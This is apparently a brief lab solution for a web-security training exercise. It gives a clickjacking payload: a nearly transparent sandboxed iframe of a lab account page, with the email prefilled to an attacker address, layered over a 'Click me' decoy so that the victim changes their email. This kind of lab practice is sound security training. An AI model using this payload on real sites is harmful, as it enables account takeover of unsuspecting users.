Here we need to use the parameter sandbox = "allow-forms".
```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:70px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://0ac600e403b9c246809ae4ad00380023.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>

```